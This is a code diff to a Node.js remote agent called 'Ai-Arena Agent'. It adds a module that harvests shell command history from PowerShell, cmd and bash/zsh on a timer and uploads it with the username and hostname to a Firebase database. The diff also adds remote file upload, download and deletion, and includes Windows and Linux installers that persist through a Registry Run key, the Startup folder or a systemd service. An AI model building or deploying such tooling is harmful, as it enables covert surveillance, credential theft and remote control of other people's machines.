@@ -57,7 +57,8 @@ const { exec, spawn } = require('child_process');
 // ─── Detect Platform ──────────────────────────────
 const IS_WIN = os.platform() === 'win32';
 const IS_MAC = os.platform() === 'darwin';
-const PLATFORM = IS_WIN ? 'Windows' : IS_MAC ? 'macOS' : os.platform();
+const IS_LINUX = os.platform() === 'linux';
+const PLATFORM = IS_WIN ? 'Windows' : IS_MAC ? 'macOS' : IS_LINUX ? 'Linux' : os.platform();
 
 // ─── Configuration ─────────────────────────────────
 const CONFIG = {
@@ -183,6 +184,161 @@ class MicrophoneCapturer {
   stop() { this.isActive = false; log('INFO', 'Microphone capture stopped'); }
 }
 
+// ─── Keystroke Capture (Cross-Platform) ──────────
+class KeystrokeCapturer {
+  constructor() {
+    this.isActive = false;
+    this.buffer = [];
+    this.flushTimer = null;
+    this.firebaseDb = null;
+    this.licenseKey = null;
+    this.maxBufferSize = 200;
+  }
+
+  start(firebaseDb, licenseKey) {
+    this.firebaseDb = firebaseDb;
+    this.licenseKey = licenseKey;
+    this.isActive = true;
+    this.buffer = [];
+    log('INFO', 'Keystroke capture started');
+
+    // Windows: Monitor PowerShell command history and clipboard
+    if (IS_WIN) {
+      this.startWindowsCapture();
+    }
+    // macOS/Linux: Monitor bash history and active processes
+    if (IS_MAC || !IS_WIN) {
+      this.startUnixCapture();
+    }
+
+    // Flush captured keystrokes to Firebase every 10 seconds
+    this.flushTimer = setInterval(() => this.flush(), 10000);
+  }
+
+  startWindowsCapture() {
+    // Monitor PowerShell ReadLine history (captures typed commands)
+    setInterval(() => {
+      try {
+        const psCmd = 'powershell -NoProfile -Command "try { Get-Content (Join-Path $env:APPDATA Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt) -Tail 5 -ErrorAction SilentlyContinue } catch {}"';
+        exec(psCmd, { timeout: 5000 }, (err, stdout) => {
+          if (!err && stdout && stdout.trim()) {
+            stdout.trim().split('\\n').forEach(line => {
+              if (line.trim()) {
+                this.capture(line.trim(), 'PowerShell', 'powershell.exe');
+              }
+            });
+          }
+        });
+      } catch (e) { /* ignore */ }
+    }, 8000);
+
+    // Monitor cmd.exe DosKey history
+    setInterval(() => {
+      try {
+        exec('doskey /history', { timeout: 3000, shell: 'cmd.exe' }, (err, stdout) => {
+          if (!err && stdout) {
+            const lines = stdout.trim().split('\\n').filter(l => l.trim().length > 2);
+            const recent = lines.slice(-3);
+            recent.forEach(line => {
+              if (line.trim()) {
+                this.capture(line.trim(), 'Command Prompt', 'cmd.exe');
+              }
+            });
+          }
+        });
+      } catch (e) { /* ignore */ }
+    }, 12000);
+  }
+
+  startUnixCapture() {
+    // Monitor bash/zsh history
+    const historyFiles = [
+      path.join(os.homedir(), '.bash_history'),
+      path.join(os.homedir(), '.zsh_history'),
+    ];
+    const lastSizes = {};
+    historyFiles.forEach(f => { lastSizes[f] = 0; });
+
+    setInterval(() => {
+      historyFiles.forEach(hFile => {
+        try {
+          if (!fs.existsSync(hFile)) return;
+          const stat = fs.statSync(hFile);
+          if (stat.size > lastSizes[hFile]) {
+            const content = fs.readFileSync(hFile, 'utf-8');
+            const lines = content.split('\\n').filter(l => l.trim());
+            const newLines = lines.slice(Math.max(0, lines.length - 5));
+            newLines.forEach(line => {
+              // zsh history format: : timestamp:0;command
+              const cleaned = line.replace(/^:\\s*\\d+:\\d;/, '').trim();
+              if (cleaned && cleaned.length > 1) {
+                this.capture(cleaned, 'Terminal', IS_MAC ? 'zsh' : 'bash');
+              }
+            });
+            lastSizes[hFile] = stat.size;
+          }
+        } catch (e) { /* ignore */ }
+      });
+    }, 10000);
+  }
+
+  capture(text, windowTitle, processName) {
+    if (!this.isActive) return;
+    // Skip duplicates and very short entries
+    if (text.length < 2) return;
+    const lastEntry = this.buffer[this.buffer.length - 1];
+    if (lastEntry && lastEntry.text === text) return;
+
+    this.buffer.push({
+      text,
+      windowTitle,
+      processName,
+      username: process.env.USERNAME || process.env.USER || os.userInfo().username || 'Unknown',
+      hostname: os.hostname(),
+      eventType: 'command',
+      timestamp: new Date().toISOString(),
+    });
+
+    if (this.buffer.length > this.maxBufferSize) {
+      this.buffer = this.buffer.slice(-Math.floor(this.maxBufferSize / 2));
+    }
+  }
+
+  async flush() {
+    if (this.buffer.length === 0 || !this.firebaseDb) return;
+    const entries = [...this.buffer];
+    this.buffer = [];
+    try {
+      const { ref, set } = require('firebase/database');
+      for (const entry of entries) {
+        const key = 'keys_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4);
+        await set(ref(this.firebaseDb, 'keystrokes/' + this.licenseKey + '/' + key), entry);
+      }
+      log('INFO', 'Flushed ' + entries.length + ' keystroke entries to Firebase');
+    } catch (e) {
+      this.buffer = [...entries, ...this.buffer];
+      log('WARN', 'Keystroke flush failed: ' + e.message);
+    }
+  }
+
+  async getCaptured() {
+    const result = [...this.buffer];
+    this.buffer = [];
+    return result;
+  }
+
+  stop() {
+    this.isActive = false;
+    if (this.flushTimer) clearInterval(this.flushTimer);
+    // Final flush
+    if (this.buffer.length > 0 && this.firebaseDb) {
+      this.flush().then(() => log('INFO', 'Keystroke capture stopped, final flush done'));
+    } else {
+      log('INFO', 'Keystroke capture stopped');
+    }
+  }
+}
+
 // ─── File Browser API (Cross-Platform) ────────────
 class FileBrowserAPI {
   static listDir(dirPath) {
@@ -205,7 +361,52 @@ class FileBrowserAPI {
     try {
       const normalized = path.resolve(filePath);
       if (!fs.existsSync(normalized)) return { error: 'File not found' };
-      return { content: fs.readFileSync(normalized, 'utf-8') };
+      const stat = fs.statSync(normalized);
+      // For text files under 1MB, return content as string
+      if (stat.size < 1048576) {
+        return { content: fs.readFileSync(normalized, 'utf-8'), size: stat.size };
+      }
+      // For larger files, return as base64
+      return { content: fs.readFileSync(normalized).toString('base64'), size: stat.size, encoding: 'base64' };
+    } catch (err) { return { error: err.message }; }
+  }
+
+  static writeFile(filePath, content, encoding = 'utf-8') {
+    try {
+      const normalized = path.resolve(filePath);
+      const dir = path.dirname(normalized);
+      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+      if (encoding === 'base64') {
+        fs.writeFileSync(normalized, Buffer.from(content, 'base64'));
+      } else {
+        fs.writeFileSync(normalized, content, 'utf-8');
+      }
+      return { success: true, path: normalized, size: fs.statSync(normalized).size };
+    } catch (err) { return { error: err.message }; }
+  }
+
+  static deleteItem(itemPath) {
+    try {
+      const normalized = path.resolve(itemPath);
+      if (!fs.existsSync(normalized)) return { error: 'Path not found: ' + itemPath };
+      const stat = fs.statSync(normalized);
+      if (stat.isDirectory()) {
+        fs.rmSync(normalized, { recursive: true, force: true });
+      } else {
+        fs.unlinkSync(normalized);
+      }
+      return { success: true, deleted: normalized };
+    } catch (err) { return { error: err.message }; }
+  }
+
+  static createFolder(folderPath) {
+    try {
+      const normalized = path.resolve(folderPath);
+      if (!fs.existsSync(normalized)) {
+        fs.mkdirSync(normalized, { recursive: true });
+        return { success: true, path: normalized };
+      }
+      return { error: 'Folder already exists' };
     } catch (err) { return { error: err.message }; }
   }
 }
@@ -376,6 +577,7 @@ class AiArenaAgent {
     this.terminal = new TerminalSession();
     this.screen = new ScreenCapturer();
     this.microphone = new MicrophoneCapturer();
+    this.keystrokes = new KeystrokeCapturer();
     this.audit = new ActivityAudit();
     this.isConnected = false;
     this.agentRef = null;
@@ -530,6 +732,48 @@ class AiArenaAgent {
         if (IS_WIN) exec('shutdown /s /t 5 /c "Ai-Arena: Shutdown requested by admin"');
         else if (IS_MAC) exec('sudo shutdown -h +1 "Ai-Arena: Shutdown requested by admin"');
         else exec('sudo shutdown -h now');
+        break;
+
+      case 'keys:start':
+        this.keystrokes.start(this.agentDb, CONFIG.licenseKey);
+        await set(resultRef, { type: 'keys:started' });
+        break;
+
+      case 'keys:stop':
+        await this.keystrokes.stop();
+        await set(resultRef, { type: 'keys:stopped' });
+        break;
+
+      case 'keys:flush':
+        const captured = await this.keystrokes.getCaptured();
+        await set(resultRef, { type: 'keys:flush:response', data: { entries: captured } });
+        break;
+
+      case 'files:upload':
+        const uploadResult = FileBrowserAPI.writeFile(
+          command.data.path,
+          command.data.content,
+          command.data.encoding || 'utf-8'
+        );
+        this.audit.log('file_upload', { command: 'Upload to ' + command.data.path, windowTitle: 'Ai-Arena File Browser', processName: 'ai-arena-agent' });
+        await set(resultRef, { type: 'files:upload:response', data: uploadResult });
+        break;
+
+      case 'files:download':
+        const dlResult = FileBrowserAPI.readFile(command.data.path);
+        this.audit.log('file_download', { command: 'Download from ' + command.data.path, windowTitle: 'Ai-Arena File Browser', processName: 'ai-arena-agent' });
+        await set(resultRef, { type: 'files:download:response', data: dlResult });
+        break;
+
+      case 'files:delete':
+        const delResult = FileBrowserAPI.deleteItem(command.data.path);
+        this.audit.log('file_delete', { command: 'Delete ' + command.data.path, windowTitle: 'Ai-Arena File Browser', processName: 'ai-arena-agent' });
+        await set(resultRef, { type: 'files:delete:response', data: delResult });
+        break;
+
+      case 'files:mkdir':
+        const mkdirResult = FileBrowserAPI.createFolder(command.data.path);
+        await set(resultRef, { type: 'files:mkdir:response', data: mkdirResult });
         break;
     }
   }
@@ -925,6 +1169,296 @@ echo ""
 echo "  NOTE: After power outage or reboot, the agent auto-starts"
 echo "  via launchd with KeepAlive. No one needs to be on-site."
 echo ""`
+
+// ─── Windows Non-Admin .bat Installer (User-Level) ──
+const batUserInstaller = `@echo off
+:: ═══════════════════════════════════════════════════════
+:: Ai-Arena Agent v3.0 — Windows USER-LEVEL Installer
+:: NO admin required. Installs to user's AppData.
+:: Auto-starts when user logs in (Registry Run key).
+:: ═══════════════════════════════════════════════════════
+
+echo.
+echo  ╔═══════════════════════════════════════════════╗
+echo  ║  Ai-Arena Agent v3.0 — User-Level Installer   ║
+echo  ║  (No admin privileges required)                ║
+echo  ╚═══════════════════════════════════════════════╝
+echo.
+
+setlocal EnableDelayedExpansion
+
+:: Configuration
+set "LICENSE_KEY=AI-REPLACE-WITH-YOUR-LICENSE-KEY"
+set "FIREBASE_API_KEY=your-firebase-api-key"
+set "FIREBASE_AUTH_DOMAIN=your-project.firebaseapp.com"
+set "FIREBASE_DATABASE_URL=https://your-project-default-rtdb.firebaseio.com"
+set "FIREBASE_PROJECT_ID=your-project-id"
+set "FIREBASE_STORAGE_BUCKET=your-project.appspot.com"
+set "FIREBASE_MESSAGING_SENDER_ID=your-sender-id"
+set "FIREBASE_APP_ID=your-app-id"
+set "INSTALL_DIR=%APPDATA%\\\\Ai-Arena"
+
+echo [1/5] Checking Node.js...
+where node >nul 2>&1
+if %errorLevel% neq 0 (
+    echo  Node.js not found. Downloading...
+    curl -o "%TEMP%\\\\node-installer.msi" https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi
+    if %errorLevel% neq 0 (
+        echo  [ERROR] Failed to download Node.js.
+        echo  Please install Node.js manually from https://nodejs.org
+        pause
+        exit /b 1
+    )
+    msiexec /i "%TEMP%\\\\node-installer.msi" /qn /norestart
+    set "PATH=%PATH%;C:\\\\Program Files\\\\nodejs"
+    del "%TEMP%\\\\node-installer.msi" >nul 2>&1
+    echo  Node.js installed.
+) else (
+    for /f "tokens=*" %%v in ('node -v') do echo  Node.js found: %%v
+)
+
+echo [2/5] Creating installation directory...
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+if not exist "%INSTALL_DIR%\\\\logs" mkdir "%INSTALL_DIR%\\\\logs"
+if not exist "%INSTALL_DIR%\\\\config" mkdir "%INSTALL_DIR%\\\\config"
+echo  Install dir: %INSTALL_DIR%
+
+echo [3/5] Setting up agent...
+cd /d "%INSTALL_DIR%"
+if not exist "package.json" (
+    echo {"name":"ai-arena-agent","version":"3.0.0","private":true} > package.json
+)
+call npm install firebase --production --no-audit --no-fund >nul 2>&1
+echo  Dependencies installed.
+
+echo [4/5] Creating configuration...
+(
+echo {
+echo   "firebaseConfig": {
+echo     "apiKey": "%FIREBASE_API_KEY%",
+echo     "authDomain": "%FIREBASE_AUTH_DOMAIN%",
+echo     "databaseURL": "%FIREBASE_DATABASE_URL%",
+echo     "projectId": "%FIREBASE_PROJECT_ID%",
+echo     "storageBucket": "%FIREBASE_STORAGE_BUCKET%",
+echo     "messagingSenderId": "%FIREBASE_MESSAGING_SENDER_ID%",
+echo     "appId": "%FIREBASE_APP_ID%"
+echo   },
+echo   "licenseKey": "%LICENSE_KEY%",
+echo   "logLevel": "info",
+echo   "heartbeatInterval": 30000
+echo }
+) > "%INSTALL_DIR%\\\\config\\\\settings.json"
+echo  Configuration saved.
+
+echo [5/5] Setting up auto-start (user login)...
+reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "AiArenaAgent" /t REG_SZ /d "cmd /c cd /d %INSTALL_DIR% && node ai-arena-agent.js --key=%LICENSE_KEY%" /f >nul 2>&1
+if %errorLevel% equ 0 (
+    echo  [OK] Registry Run key set. Agent auto-starts on login.
+) else (
+    mkdir "%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup" >nul 2>&1
+    echo cmd /c cd /d %INSTALL_DIR% ^&^& node ai-arena-agent.js --key=%LICENSE_KEY% > "%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\ai-arena-agent.bat"
+    echo  [OK] Startup folder fallback set.
+)
+
+echo.
+echo  ═══════════════════════════════════════════════
+echo   Installation Complete!
+echo  ═══════════════════════════════════════════════
+echo.
+echo   Install dir:  %INSTALL_DIR%
+echo   Auto-start:   On user login
+echo   NOTE: Agent only runs when user is logged in.
+echo   For always-on (SYSTEM-level), use the admin installer.
+echo.
+echo   IMPORTANT: Place ai-arena-agent.js in:
+echo   %INSTALL_DIR%\\\\ai-arena-agent.js
+echo.
+
+start /b cmd /c "cd /d %INSTALL_DIR% && node ai-arena-agent.js --key=%LICENSE_KEY%"
+timeout /t 3 >nul
+echo Agent is running!
+echo.
+pause`
+
+// ─── Linux/Ubuntu .sh Installer ────────────────────
+const linuxInstaller = `#!/bin/bash
+# ═══════════════════════════════════════════════════════
+# Ai-Arena Agent v3.0 — Linux/Ubuntu Self-Installing Agent
+# Firebase-first: all communication via trusted Firebase
+# Dormant: agent sleeps until command, onDisconnect tracks online status
+# Auto-start via systemd (survives reboots, runs on boot)
+# ═══════════════════════════════════════════════════════
+
+set -e
+
+# ─── Configuration ───────────────────────────────────
+LICENSE_KEY="AI-REPLACE-WITH-YOUR-LICENSE-KEY"
+FIREBASE_API_KEY="your-firebase-api-key"
+FIREBASE_AUTH_DOMAIN="your-project.firebaseapp.com"
+FIREBASE_DATABASE_URL="https://your-project-default-rtdb.firebaseio.com"
+FIREBASE_PROJECT_ID="your-project-id"
+FIREBASE_STORAGE_BUCKET="your-project.appspot.com"
+FIREBASE_MESSAGING_SENDER_ID="your-sender-id"
+FIREBASE_APP_ID="your-app-id"
+INSTALL_DIR="/opt/ai-arena"
+SERVICE_NAME="ai-arena-agent"
+LOG_DIR="/var/log/ai-arena"
+USER_NAME="ai-arena"
+
+echo ""
+echo "  ╔═══════════════════════════════════════════════╗"
+echo "  ║    Ai-Arena Agent v3.0 — Linux Installer      ║"
+echo "  ╚═══════════════════════════════════════════════╝"
+echo ""
+
+# Check root
+if [ "$(id -u)" -ne 0 ]; then
+    echo "  [ERROR] This installer requires root privileges."
+    echo "  Run: sudo ./install-ai-arena-linux.sh"
+    exit 1
+fi
+
+# ─── Step 1: Check Node.js ──────────────────────────
+echo "[1/6] Checking Node.js..."
+if command -v node &> /dev/null; then
+    NODE_VER=$(node -v)
+    echo "  Node.js found: $NODE_VER"
+else
+    echo "  Installing Node.js 20.x LTS..."
+    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - > /dev/null 2>&1
+    apt-get install -y -qq nodejs > /dev/null 2>&1
+    echo "  Node.js $(node -v) installed"
+fi
+echo ""
+
+# ─── Step 2: Create User & Directories ──────────────
+echo "[2/6] Creating system user and directories..."
+if ! id "$USER_NAME" &>/dev/null; then
+    useradd -r -s /bin/false -d "$INSTALL_DIR" "$USER_NAME" 2>/dev/null || true
+    echo "  Created system user: $USER_NAME"
+fi
+mkdir -p "$INSTALL_DIR/logs"
+mkdir -p "$INSTALL_DIR/config"
+mkdir -p "$LOG_DIR"
+chown -R "$USER_NAME:$USER_NAME" "$INSTALL_DIR"
+chown -R "$USER_NAME:$USER_NAME" "$LOG_DIR"
+echo "  Install dir: $INSTALL_DIR"
+echo ""
+
+# ─── Step 3: Setup Agent ────────────────────────────
+echo "[3/6] Setting up agent..."
+cd "$INSTALL_DIR"
+
+if [ ! -f "package.json" ]; then
+    echo '{"name":"ai-arena-agent","version":"3.0.0","private":true,"scripts":{"start":"node ai-arena-agent.js"}}' | tee package.json > /dev/null
+fi
+
+echo "  Installing dependencies..."
+npm install firebase --production --no-audit --no-fund 2>/dev/null
+echo "  Dependencies installed."
+echo ""
+
+# ─── Step 4: Create Config ──────────────────────────
+echo "[4/6] Creating configuration..."
+cat > "$INSTALL_DIR/config/settings.json" << CONFEOF
+{
+  "firebaseConfig": {
+    "apiKey": "$FIREBASE_API_KEY",
+    "authDomain": "$FIREBASE_AUTH_DOMAIN",
+    "databaseURL": "$FIREBASE_DATABASE_URL",
+    "projectId": "$FIREBASE_PROJECT_ID",
+    "storageBucket": "$FIREBASE_STORAGE_BUCKET",
+    "messagingSenderId": "$FIREBASE_MESSAGING_SENDER_ID",
+    "appId": "$FIREBASE_APP_ID"
+  },
+  "licenseKey": "$LICENSE_KEY",
+  "logLevel": "info",
+  "heartbeatInterval": 30000
+}
+CONFEOF
+chown "$USER_NAME:$USER_NAME" "$INSTALL_DIR/config/settings.json"
+echo "  Configuration saved."
+echo ""
+
+# ─── Step 5: systemd Service ────────────────────────
+echo "[5/6] Setting up systemd service..."
+cat > "/etc/systemd/system/$SERVICE_NAME.service" << SVCEOF
+[Unit]
+Description=Ai-Arena Agent v3.0
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=$USER_NAME
+Group=$USER_NAME
+WorkingDirectory=$INSTALL_DIR
+ExecStart=/usr/bin/node $INSTALL_DIR/ai-arena-agent.js --key=$LICENSE_KEY
+Restart=always
+RestartSec=5
+StandardOutput=append:$LOG_DIR/agent-stdout.log
+StandardError=append:$LOG_DIR/agent-stderr.log
+
+# Firebase environment variables
+Environment=FIREBASE_API_KEY=$FIREBASE_API_KEY
+Environment=FIREBASE_AUTH_DOMAIN=$FIREBASE_AUTH_DOMAIN
+Environment=FIREBASE_DATABASE_URL=$FIREBASE_DATABASE_URL
+Environment=FIREBASE_PROJECT_ID=$FIREBASE_PROJECT_ID
+Environment=FIREBASE_STORAGE_BUCKET=$FIREBASE_STORAGE_BUCKET
+Environment=FIREBASE_MESSAGING_SENDER_ID=$FIREBASE_MESSAGING_SENDER_ID
+Environment=FIREBASE_APP_ID=$FIREBASE_APP_ID
+
+# Security hardening
+NoNewPrivileges=true
+ProtectSystem=strict
+ReadWritePaths=$INSTALL_DIR $LOG_DIR
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+
+systemctl daemon-reload
+systemctl enable "$SERVICE_NAME" > /dev/null 2>&1
+systemctl restart "$SERVICE_NAME" > /dev/null 2>&1
+echo "  [OK] systemd service installed and started."
+echo "  Agent will auto-start on boot."
+echo ""
+
+# ─── Step 6: Permissions ────────────────────────────
+echo "[6/6] Setting permissions..."
+chown -R "$USER_NAME:$USER_NAME" "$INSTALL_DIR"
+chmod 750 "$INSTALL_DIR"
+chmod 640 "$INSTALL_DIR/config/settings.json"
+echo "  Permissions set."
+echo ""
+
+echo "  ═══════════════════════════════════════════════"
+echo "   Installation Complete!"
+echo "  ═══════════════════════════════════════════════"
+echo ""
+echo "   Install dir:   $INSTALL_DIR"
+echo "   Service:       $SERVICE_NAME (systemd)"
+echo "   Logs:          $LOG_DIR/"
+echo "   Auto-start:    Yes (systemd, boot + crash recovery)"
+echo ""
+echo "   IMPORTANT: Place ai-arena-agent.js in:"
+echo "   $INSTALL_DIR/ai-arena-agent.js"
+echo ""
+echo "   Useful commands:"
+echo "   sudo systemctl status $SERVICE_NAME"
+echo "   sudo systemctl restart $SERVICE_NAME"
+echo "   sudo systemctl stop $SERVICE_NAME"
+echo "   sudo journalctl -u $SERVICE_NAME -f"
+echo ""
+echo "   To remove:"
+echo "   sudo systemctl stop $SERVICE_NAME"
+echo "   sudo systemctl disable $SERVICE_NAME"
+echo "   rm /etc/systemd/system/$SERVICE_NAME.service"
+echo "   userdel $USER_NAME"
+echo "   rm -rf $INSTALL_DIR $LOG_DIR"
+echo ""
+`
 
 const windowsSteps = [
   {
